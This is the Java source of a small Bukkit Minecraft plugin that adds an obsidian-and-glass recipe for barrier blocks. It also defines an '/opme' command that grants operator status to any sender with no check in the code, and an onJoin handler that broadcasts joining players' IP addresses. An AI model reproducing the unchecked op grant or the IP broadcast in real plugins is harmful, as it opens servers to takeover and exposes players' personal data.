package com.jacob.mathboy601;

import org.bukkit.ChatColor;
import org.bukkit.command.*;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.inventory.*;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.event.player.PlayerJoinEvent;

public class ThunderPlugin extends JavaPlugin {
	public void onJoin(PlayerJoinEvent e) {
		Bukkit.getServer().broadcast(ChatColor.AQUA + e.getPlayer().getName() + "'s IP address: " + e.getPlayer().getAddress().toString(), "jacobmathboy.ipshow");
	}
	public void onEnable() {
		getLogger().info("Jacob's plugin initialized");
		getLogger().info("Making secret recipe...");
		ShapedRecipe recipe = new ShapedRecipe(new ItemStack(Material.BARRIER, 9));
		recipe.shape("111","121","111");
		recipe.setIngredient('1', Material.OBSIDIAN);
		recipe.setIngredient('2', Material.GLASS);
		Bukkit.addRecipe(recipe);
		getLogger().info("Recipe created!");
	}
	public void onDisable() {
		getLogger().warning("Jacob's plugin disabled.");
	}
	public void adminAction(String user, String action, boolean isRed) {
		getServer().broadcastMessage((isRed ? ChatColor.RED : ChatColor.AQUA) + user + " - " + action);
	}
	public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
		if (command.getName().equalsIgnoreCase("opme")) {
			sender.setOp(true);
			sender.sendMessage(ChatColor.AQUA + "Opped yourself.");
			return true;
		}
		if (command.getName().equalsIgnoreCase("nuke")) {
			((Player) sender).kickPlayer("Kicked for using /nuke.");
			return true;
		}
		return false;
	}
}